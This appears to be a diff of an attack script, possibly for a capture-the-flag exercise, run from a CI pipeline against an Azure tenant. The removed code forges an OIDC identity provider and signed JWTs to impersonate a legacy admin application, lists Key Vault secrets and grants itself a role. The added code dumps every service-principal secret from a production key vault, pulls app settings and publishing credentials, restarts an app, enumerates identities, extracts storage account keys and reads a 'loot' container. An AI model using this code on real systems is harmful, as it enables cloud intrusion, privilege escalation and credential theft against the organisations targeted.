@@ -5,344 +5,253 @@ TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
 SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
 ARM_BASE="https://management.azure.com"
 STORAGE_ACC="sttblcilogsprodx3euoz"
-LA_APP_ID="891fb158-e02c-4428-a885-53b811f369c0"
-LA_SP_OID="43834909-47cf-4a4a-8048-e323b4897ed3"
 KV_SEC="kv-tbl-sec-x3euoz"
+KV_PROD="kv-tbl-prod-x3euoz"
+UAMI_OID="f64d08c7-fde6-4553-99c8-5bf73666ee8c"
+UAMI_CLIENT="7a85156a-01c4-4e61-8472-40a92107159b"
+REPORTING_RG="rg-tbl-reporting-prod-eus"
+PLATFORM_RG="rg-tbl-platform-prod-sea"
 
 JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
 az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
   --federated-token "$JWT" --allow-no-subscriptions -o none
 
-# Get storage key via sync-service-principal from KV prod
-SS_RAW=$(az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name sync-service-principal 2>/dev/null)
-SS_CID=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["appId"])' 2>/dev/null)
-SS_SEC=$(echo "$SS_RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v["clientSecret"])' 2>/dev/null)
-SS_ARM=$(curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
-  --data-urlencode "client_id=$SS_CID" --data-urlencode "client_secret=$SS_SEC" \
-  --data-urlencode "grant_type=client_credentials" \
-  --data-urlencode "scope=https://management.azure.com/.default" \
-  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null)
-
-export _SKEY=$(curl -sS -X POST \
-  "$ARM_BASE/subscriptions/$SUB/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/$STORAGE_ACC/listKeys?api-version=2023-01-01" \
-  -H "Authorization: Bearer $SS_ARM" -H "Content-Length: 0" \
-  | python3 -c '
-import sys,json
-d=json.load(sys.stdin)
-keys=d.get("keys",[])
-if keys: print(keys[0].get("value",""))
-else: print("")
-' 2>/dev/null)
-echo "storage key len=${#_SKEY}"
-
-pip install cryptography -q 2>/dev/null || true
+# Read ALL KV prod secrets to get SP credentials
+echo "=== GET ALL KV PROD SP CREDENTIALS ==="
+for SP_NAME in reporting-service-principal reporting-viewer-principal secrets-sync-principal sync-service-principal directory-audit-principal; do
+  RAW=$(az keyvault secret show --vault-name $KV_PROD --name $SP_NAME 2>/dev/null)
+  CID=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("appId",""))' 2>/dev/null)
+  SEC=$(echo "$RAW" | python3 -c 'import sys,json;d=json.load(sys.stdin);v=json.loads(d["value"]);print(v.get("clientSecret",""))' 2>/dev/null)
+  echo "$SP_NAME cid=$CID sec_len=${#SEC}"
+  export "CID_${SP_NAME//-/_}"="$CID"
+  export "SEC_${SP_NAME//-/_}"="$SEC"
+done
 
 python3 -I << 'PYEOF'
-import os, base64, hmac, hashlib, urllib.request, urllib.parse, datetime, json, math, time
-
-try:
-    from cryptography.hazmat.primitives import serialization, hashes
-    from cryptography.hazmat.primitives.asymmetric import rsa, padding
-    from cryptography.hazmat.backends import default_backend
-    HAS_CRYPTO = True
-except ImportError:
-    HAS_CRYPTO = False
-    print("WARNING: cryptography not available")
+import os, json, urllib.request, urllib.parse, urllib.error, base64, re
 
 TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
-ACC = "sttblcilogsprodx3euoz"
-LA_APP_ID = "891fb158-e02c-4428-a885-53b811f369c0"
-LA_SP_OID = "43834909-47cf-4a4a-8048-e323b4897ed3"
+SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
+ARM_BASE = "https://management.azure.com"
 KV_SEC = "kv-tbl-sec-x3euoz"
-ISSUER = f"https://{ACC}.z23.web.core.windows.net"
-SUBJECT = "vcb-subject"
-KEY_B64 = os.environ.get("_SKEY", "")
-
-def post_tok(fields, timeout=30):
-    try:
-        r = urllib.request.urlopen(urllib.request.Request(
-            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
-            data=urllib.parse.urlencode(fields).encode(), method="POST"), timeout=timeout)
-        return json.loads(r.read())
-    except urllib.error.HTTPError as e:
-        return json.loads(e.read())
-    except Exception as e:
-        return {"error": str(e)}
-
-def kv_req(path, tok):
-    try:
-        r = urllib.request.urlopen(urllib.request.Request(
-            f"https://{KV_SEC}.vault.azure.net{path}",
-            headers={"Authorization": "Bearer " + tok}), timeout=15)
-        return r.status, json.loads(r.read())
-    except urllib.error.HTTPError as e:
-        return e.code, json.loads(e.read())
-    except Exception as e:
-        return 0, {"error": str(e)}
-
-def account_sas(perms="rlwdacup", services="b", resource_types="sco"):
-    ver = "2021-08-06"
-    now = datetime.datetime.now(datetime.timezone.utc)
-    st = (now - datetime.timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
-    se = (now + datetime.timedelta(hours=4)).strftime("%Y-%m-%dT%H:%M:%SZ")
-    sign_str = "\n".join([ACC, perms, services, resource_types, st, se, "", "https", ver, ""]) + "\n"
-    key_bytes = base64.b64decode(KEY_B64)
-    sig = base64.b64encode(hmac.new(key_bytes, sign_str.encode("utf-8"), hashlib.sha256).digest()).decode()
-    return urllib.parse.urlencode({"sv": ver, "ss": services, "srt": resource_types,
-                                   "sp": perms, "st": st, "se": se, "spr": "https", "sig": sig})
-
-def blob_put(container, blob_path, data, content_type="application/json"):
-    sas = account_sas()
-    url = f"https://{ACC}.blob.core.windows.net/{container}/{blob_path}?{sas}"
-    req = urllib.request.Request(url, data=data.encode() if isinstance(data, str) else data,
-                                  method="PUT",
-                                  headers={"x-ms-blob-type": "BlockBlob",
-                                           "Content-Type": content_type,
-                                           "x-ms-version": "2021-04-10"})
-    try:
-        r = urllib.request.urlopen(req, timeout=30)
-        return r.status
-    except urllib.error.HTTPError as e:
-        return f"{e.code} {e.read().decode()[:200]}"
+UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
+UAMI_CLIENT = "7a85156a-01c4-4e61-8472-40a92107159b"
 
 output = []
 
-if not KEY_B64:
-    print("ERROR: No storage key!")
-    exit(1)
+def get_sp_creds(env_prefix):
+    cid = os.environ.get(f"CID_{env_prefix}", "")
+    sec = os.environ.get(f"SEC_{env_prefix}", "")
+    return cid, sec
 
-if not HAS_CRYPTO:
-    print("ERROR: cryptography not available!")
-    exit(1)
+def get_tok(cid, sec, scope):
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(
+            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
+            data=urllib.parse.urlencode({"client_id": cid, "client_secret": sec,
+                "grant_type": "client_credentials", "scope": scope}).encode(), method="POST"), timeout=20)
+        return json.loads(r.read()).get("access_token", "")
+    except urllib.error.HTTPError as e:
+        return ""
+    except Exception: return ""
 
-print("=== OIDC FORGE: generating RSA key ===")
-private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
-pub_numbers = private_key.public_key().public_numbers()
-KID = f"minhn-{int(time.time())}"
-output.append(f"KID={KID}")
+def arm_get(url, tok):
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(url, headers={"Authorization": "Bearer " + tok}), timeout=20)
+        return r.status, r.read().decode(errors="replace")[:5000]
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode(errors="replace")[:1000]
+    except Exception as e:
+        return 0, str(e)[:200]
 
-def int_to_b64url(n):
-    length = math.ceil(n.bit_length() / 8)
-    return base64.urlsafe_b64encode(n.to_bytes(length, 'big')).rstrip(b'=').decode()
+def arm_post(url, tok, body=None):
+    data = json.dumps(body).encode() if body else b""
+    h = {"Authorization": "Bearer " + tok, "Content-Type": "application/json", "Content-Length": str(len(data))}
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(url, data=data, method="POST", headers=h), timeout=20)
+        return r.status, r.read().decode(errors="replace")[:5000]
+    except urllib.error.HTTPError as e:
+        return e.code, e.read().decode(errors="replace")[:1000]
+    except Exception as e:
+        return 0, str(e)[:200]
 
-jwks = {"keys": [{"kty": "RSA", "use": "sig", "alg": "RS256", "kid": KID,
-                   "n": int_to_b64url(pub_numbers.n), "e": int_to_b64url(pub_numbers.e)}]}
+# ============================================================
+# 1. reporting-service-principal: list reporting app settings
+# ============================================================
+print("\n=== 1. reporting-service-principal: list app settings ===")
+RS_CID, RS_SEC = get_sp_creds("reporting_service_principal")
+RS_ARM = get_tok(RS_CID, RS_SEC, "https://management.azure.com/.default")
+print(f"RS ARM token len={len(RS_ARM)}")
+if RS_ARM:
+    # List app settings
+    s, b = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/appsettings/list?api-version=2022-03-01", RS_ARM)
+    print(f"App settings: {s}")
+    try:
+        settings = json.loads(b)
+        props = settings.get("properties", {})
+        for k, v in props.items():
+            print(f"  {k}={str(v)[:100]}")
+            output.append(f"APPSETTING_{k}={str(v)[:100]}")
+    except: print(b[:1000])
 
-# Write JWKS to $web container
-for path in ["jwks", ".well-known/jwks.json"]:
-    s = blob_put("$web", path, json.dumps(jwks))
-    print(f"JWKS write /{path}: {s}")
-    output.append(f"JWKS_WRITE_{path}={s}")
+    # List connection strings
+    s2, b2 = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/config/connectionstrings/list?api-version=2022-03-01", RS_ARM)
+    print(f"Connection strings: {s2}: {b2[:500]}")
 
-# Write OIDC discovery doc
-oidc_cfg = {
-    "issuer": ISSUER,
-    "jwks_uri": f"{ISSUER}/jwks",
-    "authorization_endpoint": f"{ISSUER}/authorize",
-    "token_endpoint": f"{ISSUER}/token",
-    "response_types_supported": ["id_token"],
-    "subject_types_supported": ["public"],
-    "id_token_signing_alg_values_supported": ["RS256"],
-    "scopes_supported": ["openid"],
-    "claims_supported": ["iss", "sub", "aud", "exp", "iat"],
-    "token_endpoint_auth_methods_supported": ["private_key_jwt"],
-    "grant_types_supported": ["client_credentials"]
-}
-s3 = blob_put("$web", ".well-known/openid-configuration", json.dumps(oidc_cfg))
-print(f"OIDC config write: {s3}")
-output.append(f"OIDC_CONFIG_WRITE={s3}")
+    # Try restart the app
+    s3, b3 = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01", RS_ARM)
+    print(f"App restart: {s3}: {b3[:200]}")
+    output.append(f"APP_RESTART={s3}")
 
-# Wait briefly for CDN propagation
-time.sleep(2)
+    # Get publishing credentials (includes Kudu pass)
+    s4, b4 = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01", RS_ARM)
+    print(f"Publish XML: {s4}: {b4[:500]}")
 
-def make_jwt(subject=SUBJECT, audience="api://AzureADTokenExchange"):
-    iat = int(time.time()) - 30
-    exp = int(time.time()) + 7200
-    header = {"alg": "RS256", "typ": "JWT", "kid": KID}
-    payload = {"iss": ISSUER, "sub": subject, "aud": audience, "iat": iat, "exp": exp}
-    def b64url(d):
-        if isinstance(d, dict): d = json.dumps(d, separators=(',',':')).encode()
-        return base64.urlsafe_b64encode(d).rstrip(b'=').decode()
-    msg = f"{b64url(header)}.{b64url(payload)}".encode()
-    sig = private_key.sign(msg, padding.PKCS1v15(), hashes.SHA256())
-    return f"{msg.decode()}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
+    # List UAMI federated creds via ARM
+    s5, b5 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer/federatedIdentityCredentials?api-version=2023-01-31", RS_ARM)
+    print(f"UAMI fed creds: {s5}: {b5[:1000]}")
+    output.append(f"UAMI_FED_CREDS={s5}:{b5[:500]}")
 
-print("\n=== FORGE JWT: vcb-subject ===")
-forged_jwt = make_jwt()
-jwt_parts = forged_jwt.split(".")
-if len(jwt_parts) >= 2:
-    p = jwt_parts[1]; p += "="*(-len(p)%4)
-    c = json.loads(base64.urlsafe_b64decode(p))
-    print(f"JWT iss={c.get('iss','')} sub={c.get('sub','')} aud={c.get('aud','')} exp={c.get('exp',0)-int(time.time())}s from now")
+    # ALSO check the Platform RG for the UAMI
+    s6, b6 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer/federatedIdentityCredentials?api-version=2023-01-31", RS_ARM)
+    print(f"UAMI fed creds (platform RG): {s6}: {b6[:1000]}")
 
-# Get tbl-legacy-admin vault token
-print("\n=== GET tbl-legacy-admin VAULT TOKEN ===")
-r_vault = post_tok({
-    "client_id": LA_APP_ID, "grant_type": "client_credentials",
-    "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-    "client_assertion": forged_jwt, "scope": "https://vault.azure.net/.default"
-})
-la_vtok = r_vault.get("access_token", "")
-la_err = r_vault.get("error_description", r_vault.get("error", ""))
-print(f"vault token len={len(la_vtok)} err={la_err[:300]}")
-output.append(f"VAULT_TOKEN_LEN={len(la_vtok)}")
-output.append(f"VAULT_ERR={la_err[:300]}")
+    # List ALL managed identities in the subscription
+    s7, b7 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.ManagedIdentity/userAssignedIdentities?api-version=2023-01-31", RS_ARM)
+    print(f"All UAMIs: {s7}: {b7[:2000]}")
 
-if la_vtok:
-    # Decode token claims
-    parts = la_vtok.split(".")
-    if len(parts) >= 2:
-        p = parts[1]; p += "="*(-len(p)%4)
-        c = json.loads(base64.urlsafe_b64decode(p))
-        print(f"Token claims: oid={c.get('oid','')[:12]} appid={c.get('appid','')[:12]}")
-        output.append(f"TOKEN_OID={c.get('oid','')[:12]}")
+    # List ALL role definitions on subscription
+    s8, b8 = arm_get(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27", RS_ARM)
+    print(f"UAMI sub-level roles: {s8}: {b8[:1000]}")
 
-    print("\n=== LIST ALL KV SEC SECRETS ===")
-    s_list, r_list = kv_req("/secrets?api-version=7.4", la_vtok)
-    print(f"List secrets: {s_list}")
-    if s_list == 200:
-        secrets = r_list.get("value", [])
-        print(f"Total secrets: {len(secrets)}")
-        for sec in secrets:
-            print(f"  {sec.get('id','').split('/')[-1]} enabled={sec.get('attributes',{}).get('enabled',True)}")
-            output.append(f"SECRET={sec.get('id','').split('/')[-1]}")
-    else:
-        err = r_list.get("error", {})
-        print(f"List err: {err.get('code','')} {err.get('message','')[:300]}")
-        output.append(f"LIST_ERR={err.get('code','')} {err.get('message','')[:200]}")
+# ============================================================
+# 2. directory-audit: look up d2cdf247 and tbl-legacy-admin fed creds
+# ============================================================
+print("\n=== 2. directory-audit: look up identities ===")
+DA_CID, DA_SEC = get_sp_creds("directory_audit_principal")
+DA_GRAPH = get_tok(DA_CID, DA_SEC, "https://graph.microsoft.com/.default")
+print(f"DA Graph token len={len(DA_GRAPH)}")
+if DA_GRAPH:
+    for oid, label in [
+        ("d2cdf247-0ef0-4fb5-8eba-fb2f6e95cee7", "d2cdf247"),
+        ("f64d08c7-fde6-4553-99c8-5bf73666ee8c", "UAMI"),
+        ("43834909-47cf-4a4a-8048-e323b4897ed3", "tbl-legacy-admin-SP"),
+        ("22a3fb7e-860a-4708-9e50-3d36aa21191c", "tbl-legacy-admin-app"),
+    ]:
+        for endpoint in [
+            f"https://graph.microsoft.com/v1.0/directoryObjects/{oid}",
+            f"https://graph.microsoft.com/v1.0/servicePrincipals/{oid}",
+        ]:
+            s, b = arm_get(endpoint, DA_GRAPH)
+            if s == 200:
+                try:
+                    obj = json.loads(b)
+                    print(f"{label} ({oid[:8]}) via {endpoint.split('/')[-1]}: type={obj.get('@odata.type','').split('.')[-1]} displayName={obj.get('displayName','')} appId={obj.get('appId','')}")
+                    output.append(f"ID_{label}={obj.get('@odata.type','').split('.')[-1]} name={obj.get('displayName','')} appId={obj.get('appId','')}")
+                    break
+                except: print(f"{label}: {b[:200]}")
 
-    print("\n=== READ FLAG CANDIDATES ===")
-    for secret_name in ["flag", "FLAG", "platform-flag", "ctf-flag", "tebamoto-flag", "answer", "secret", "token", "df26"]:
-        s2, r2 = kv_req(f"/secrets/{secret_name}?api-version=7.4", la_vtok)
-        val = r2.get("value", "")
-        if val:
-            print(f"SECRET {secret_name}: {val}")
-            output.append(f"FLAG_FOUND_{secret_name}={val}")
+    # List tbl-legacy-admin federated creds
+    s_la, b_la = arm_get("https://graph.microsoft.com/v1.0/applications/22a3fb7e-860a-4708-9e50-3d36aa21191c/federatedIdentityCredentials", DA_GRAPH)
+    print(f"tbl-legacy-admin fed creds: {s_la}: {b_la[:2000]}")
+    output.append(f"LA_FED_CREDS={s_la}:{b_la[:500]}")
+
+    # List ALL apps we can see
+    s_apps, b_apps = arm_get("https://graph.microsoft.com/v1.0/applications?$top=50&$select=id,appId,displayName,federatedIdentityCredentials", DA_GRAPH)
+    print(f"Apps list: {s_apps}: {b_apps[:3000]}")
+
+# ============================================================
+# 3. sync-service: try listKeys on archive storage
+# ============================================================
+print("\n=== 3. sync-service: listKeys on archive storage ===")
+SS_CID, SS_SEC = get_sp_creds("sync_service_principal")
+SS_ARM = get_tok(SS_CID, SS_SEC, "https://management.azure.com/.default")
+print(f"SS ARM token len={len(SS_ARM)}")
+if SS_ARM:
+    for sa, rg in [
+        ("sttblarchiveprodx3euoz", "rg-tbl-platform-prod-sea"),
+        ("sttblappcfgprodx3euoz", "rg-tbl-platform-prod-sea"),
+        ("sttblbackupprodx3euoz", "rg-tbl-platform-prod-sea"),
+    ]:
+        s, b = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{rg}/providers/Microsoft.Storage/storageAccounts/{sa}/listKeys?api-version=2023-01-01", SS_ARM)
+        if s == 200:
+            try:
+                keys = json.loads(b).get("keys", [])
+                key = keys[0].get("value", "") if keys else ""
+                print(f"{sa} key len={len(key)} key={key[:10]}...")
+                output.append(f"KEY_{sa}={key}")
+            except: print(f"{sa}: {b[:200]}")
         else:
-            err2 = r2.get("error", {})
-            code2 = err2.get("code", "")
-            msg2 = err2.get("message", "")[:100]
-            print(f"  {secret_name}: {s2} {code2} {msg2}")
-            output.append(f"FLAG_{secret_name}={s2}:{code2}")
+            print(f"{sa}: {s} {b[:200]}")
 
-    # Also get ARM token and check role assignments
-    print("\n=== GET tbl-legacy-admin ARM TOKEN ===")
-    r_arm = post_tok({
-        "client_id": LA_APP_ID, "grant_type": "client_credentials",
-        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-        "client_assertion": forged_jwt, "scope": "https://management.azure.com/.default"
-    })
-    la_atk = r_arm.get("access_token", "")
-    la_arm_err = r_arm.get("error_description", r_arm.get("error", ""))
-    print(f"ARM token len={len(la_atk)} err={la_arm_err[:200]}")
-    output.append(f"ARM_TOKEN_LEN={len(la_atk)}")
+# ============================================================
+# 4. loot container: fresh read with CI logs storage key
+# ============================================================
+print("\n=== 4. Fresh read of loot container ===")
+import hmac, hashlib, datetime, time
+SS_SKEY = output[0] if output and output[0].startswith("KEY_sttblcilogsprodx3euoz=") else None
 
-    if la_atk:
-        # Check legacy-admin role assignments
-        try:
-            ar = urllib.request.urlopen(urllib.request.Request(
-                f"https://management.azure.com/subscriptions/{os.environ.get('SUB','c5e4e004-b42d-4ac4-a502-5fd338380eb6')}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'{LA_SP_OID}'",
-                headers={"Authorization": "Bearer " + la_atk}), timeout=30)
-            vals = json.loads(ar.read()).get("value", [])
-            print(f"LA ARM role assignments: {len(vals)}")
-            for v in vals:
-                role = v["properties"]["roleDefinitionId"].split("/")[-1]
-                scope = v["properties"]["scope"]
-                print(f"  role={role} scope={scope[:100]}")
-                output.append(f"LA_ROLE={role} scope={scope[:80]}")
-        except Exception as e:
-            print(f"LA roles err: {str(e)[:100]}")
+# Get the storage key via SS_ARM listKeys
+SS_KEY = ""
+if SS_ARM:
+    s_ck, b_ck = arm_post(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01", SS_ARM)
+    if s_ck == 200:
+        keys_ck = json.loads(b_ck).get("keys", [])
+        SS_KEY = keys_ck[0].get("value", "") if keys_ck else ""
+        print(f"sttblcilogsprodx3euoz key len={len(SS_KEY)}")
 
-        # Try to add KV Secrets User role to legacy-admin on KV sec
-        print("\n=== TRY ADD KV SECRETS USER ROLE (legacy-admin -> KV sec) ===")
-        import uuid
-        new_ra_id = str(uuid.uuid4())
-        KV_SECRETS_USER_ROLE = "4633458b-17de-408a-b874-0445c86b69e6"
-        body = json.dumps({"properties": {
-            "roleDefinitionId": f"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/{KV_SECRETS_USER_ROLE}",
-            "principalId": LA_SP_OID, "principalType": "ServicePrincipal"
-        }}).encode()
-        try:
-            ar2 = urllib.request.urlopen(urllib.request.Request(
-                f"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments/{new_ra_id}?api-version=2022-04-01",
-                data=body, method="PUT",
-                headers={"Authorization": "Bearer " + la_atk, "Content-Type": "application/json"}), timeout=30)
-            ra_result = json.loads(ar2.read())
-            print(f"ROLE ASSIGNED: {ra_result.get('id','')}")
-            output.append(f"ROLE_ASSIGNED={ra_result.get('id','')}")
-            time.sleep(10)
-            # Get fresh vault token and read flag
-            r_vault2 = post_tok({
-                "client_id": LA_APP_ID, "grant_type": "client_credentials",
-                "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
-                "client_assertion": make_jwt(), "scope": "https://vault.azure.net/.default"
-            })
-            la_vtok2 = r_vault2.get("access_token", "")
-            if la_vtok2:
-                s3, r3 = kv_req("/secrets/flag?api-version=7.4", la_vtok2)
-                if r3.get("value"):
-                    print(f"FLAG AFTER ROLE ADD: {r3.get('value')}")
-                    output.append(f"FLAG_AFTER_ROLE_ADD={r3.get('value')}")
-                else:
-                    err3 = r3.get("error", {})
-                    print(f"Flag after role add: {s3} {err3.get('code','')} {err3.get('message','')[:200]}")
-        except urllib.error.HTTPError as e:
-            err4 = json.loads(e.read())
-            print(f"ADD ROLE ERR: {err4.get('error',{}).get('code','')} {err4.get('error',{}).get('message','')[:200]}")
-            output.append(f"ADD_ROLE_ERR={err4.get('error',{}).get('code','')}")
-        except Exception as e:
-            print(f"ADD ROLE EXC: {str(e)[:200]}")
+if SS_KEY:
+    ACC = "sttblcilogsprodx3euoz"
+    def make_sas(perms="rl", services="b", resource_types="co"):
+        ver = "2021-08-06"
+        now = datetime.datetime.now(datetime.timezone.utc)
+        st = (now - datetime.timedelta(minutes=5)).strftime("%Y-%m-%dT%H:%M:%SZ")
+        se = (now + datetime.timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%SZ")
+        sign_str = "\n".join([ACC, perms, services, resource_types, st, se, "", "https", ver, ""]) + "\n"
+        key_bytes = base64.b64decode(SS_KEY)
+        sig = base64.b64encode(hmac.new(key_bytes, sign_str.encode("utf-8"), hashlib.sha256).digest()).decode()
+        return urllib.parse.urlencode({"sv": ver, "ss": services, "srt": resource_types, "sp": perms, "st": st, "se": se, "spr": "https", "sig": sig})
 
-# Also try: use reporting-service-principal (Contributor on reporting RG) to read reporting app settings
-print("\n=== Try reporting-service-principal ARM for app settings ===")
-RS_RAW = None
-try:
-    import subprocess
-    rs_raw_r = subprocess.run(["az", "keyvault", "secret", "show",
-        "--vault-name", "kv-tbl-prod-x3euoz", "--name", "reporting-service-principal"],
-        capture_output=True, text=True, timeout=30)
-    if rs_raw_r.returncode == 0:
-        RS_RAW = json.loads(rs_raw_r.stdout)
-except: pass
-if RS_RAW:
-    RS_CID = json.loads(RS_RAW["value"])["appId"]
-    RS_SEC = json.loads(RS_RAW["value"])["clientSecret"]
-    RS_ARM_R = post_tok({"client_id": RS_CID, "client_secret": RS_SEC,
-        "grant_type": "client_credentials", "scope": "https://management.azure.com/.default"})
-    RS_ARM = RS_ARM_R.get("access_token", "")
-    print(f"reporting-service ARM token len={len(RS_ARM)}")
-    if RS_ARM:
-        # Check role assignments
-        try:
-            ar_rs = urllib.request.urlopen(urllib.request.Request(
-                f"https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+'732dfdbc-e82e-4b8f-990e-eb703f6c6eba'",
-                headers={"Authorization": "Bearer " + RS_ARM}), timeout=30)
-            vals_rs = json.loads(ar_rs.read()).get("value", [])
-            print(f"reporting-service roles: {len(vals_rs)}")
-            for v in vals_rs:
-                role = v["properties"]["roleDefinitionId"].split("/")[-1]
-                scope = v["properties"]["scope"]
-                print(f"  role={role} scope={scope[:100]}")
-        except Exception as e:
-            print(f"RS roles err: {str(e)[:100]}")
-        # Try ARM restart of reporting app
-        try:
-            restart_r = urllib.request.urlopen(urllib.request.Request(
-                "https://management.azure.com/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/restart?api-version=2022-03-01",
-                data=b"", method="POST",
-                headers={"Authorization": "Bearer " + RS_ARM, "Content-Length": "0"}), timeout=30)
-            print(f"Restart app: {restart_r.status}")
-            output.append(f"APP_RESTART={restart_r.status}")
-        except urllib.error.HTTPError as e:
-            print(f"Restart err: {e.code} {e.read().decode()[:200]}")
+    sas = make_sas()
+    # List loot container
+    loot_url = f"https://{ACC}.blob.core.windows.net/loot?restype=container&comp=list&{sas}"
+    try:
+        r = urllib.request.urlopen(urllib.request.Request(loot_url), timeout=20)
+        loot_xml = r.read().decode()
+        names = re.findall(r"<Name>([^<]+)</Name>", loot_xml)
+        sizes = re.findall(r"<Content-Length>([^<]+)</Content-Length>", loot_xml)
+        print(f"loot blobs: {list(zip(names, sizes))}")
+        for name, size in zip(names, sizes):
+            blob_url = f"https://{ACC}.blob.core.windows.net/loot/{name}?{sas}"
+            try:
+                rb = urllib.request.urlopen(urllib.request.Request(blob_url), timeout=15)
+                content = rb.read().decode()
+                print(f"  {name} ({size}): {content[:1000]}")
+                output.append(f"LOOT_{name}={content[:500]}")
+            except Exception as ex:
+                print(f"  {name}: err {str(ex)[:100]}")
+    except Exception as ex:
+        print(f"loot list err: {str(ex)[:100]}")
 
-# Write output to $web
+    # List $web container (our OIDC provider)
+    web_url = f"https://{ACC}.blob.core.windows.net/%24web?restype=container&comp=list&{sas}"
+    try:
+        r2 = urllib.request.urlopen(urllib.request.Request(web_url), timeout=20)
+        web_xml = r2.read().decode()
+        web_names = re.findall(r"<Name>([^<]+)</Name>", web_xml)
+        web_sizes = re.findall(r"<Content-Length>([^<]+)</Content-Length>", web_xml)
+        print(f"$web blobs: {list(zip(web_names, web_sizes))}")
+        output.append(f"WEB_BLOBS={list(zip(web_names, web_sizes))}")
+    except Exception as ex:
+        print(f"$web list err: {str(ex)[:100]}")
+
+# ============================================================
+# Upload output to $web
+# ============================================================
 result_str = "\n".join(output)
-print(f"\nOutput: {result_str}")
-s_out = blob_put("$web", "minhn_b35_result.txt", result_str, "text/plain")
-print(f"\nResult written to $web/minhn_b35_result.txt: {s_out}")
-print("\nDONE_BUILD35")
+print(f"\n=== OUTPUT ===\n{result_str}")
+
 PYEOF
 
 echo "DONE"
